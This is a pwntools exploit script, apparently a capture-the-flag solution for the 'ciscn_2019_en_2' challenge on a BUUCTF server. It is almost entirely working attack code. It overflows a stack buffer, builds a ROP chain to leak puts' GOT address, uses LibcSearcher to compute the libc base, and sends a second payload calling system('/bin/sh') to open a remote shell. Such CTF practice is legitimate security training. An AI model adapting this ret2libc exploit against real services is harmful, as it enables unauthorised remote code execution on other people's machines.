from pwn import *
from LibcSearcher import *
p = remote("node4.buuoj.cn",27065)

#context.log_level='debug'
elf = ELF("./ciscn_2019_en_2")
main_addr = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret=0x0000000000400c83
payload = b'\0' + b'a' * (0x50 + 0x08 - 0x01) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter("Input your choice!",b'1')
p.sendlineafter("Input your Plaintext to be encrypted",payload)

puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
ret_addr=0x00000000004006b9
# libc_base = puts_addr - libc.symbols['puts']
# system_addr = libc_base + libc.symbols['system']
# binsh_addr = libc_base + libc.search('/bin/sh').next()

p.sendlineafter('Input your choice!\n', b'1')
payload7 = b'\0' + b'a' * (0x50 + 0x08 - 0x01) + p64(ret_addr) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
# payload7 = b'\0' + b'a' * (0x50 + 0x08 - 0x01) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
# payload7 = b'a' * 0x58 + p64(ret_addr) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
sleep(1)
p.sendlineafter('encrypted\n', payload7)

# p.shutdown('send')
p.interactive()
